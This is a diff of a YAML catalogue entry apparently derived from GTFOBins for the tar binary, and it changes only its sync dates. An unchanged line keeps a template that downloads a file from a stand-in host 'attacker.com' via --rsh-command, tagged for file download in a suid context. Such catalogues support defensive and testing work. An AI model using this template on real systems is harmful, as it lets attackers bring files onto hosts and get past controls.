@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd5246
-  last_synced: '2026-08-28'
+  last_synced: '2026-08-29'
 commands:
 - template: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
   comment: The attacker box must have the `rmt` utility installed.
@@ -31,7 +31,7 @@ source_data:
       context: suid
     upstream_url: https://gtfobins.github.io/gtfobins/tar/
     upstream_version: acd5246
-    last_synced: '2026-08-28'
+    last_synced: '2026-08-29'
 enrichment:
   capabilities:
   - value: file-download
@@ -67,6 +67,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-08-28'
+  projected_at: '2026-08-29'
   source_hashes:
     GTFOBins: sha256:a8e14feb90cb457ae7f6ab0b9d6283f12d5e33444b13afd15358f6df2ec15eed
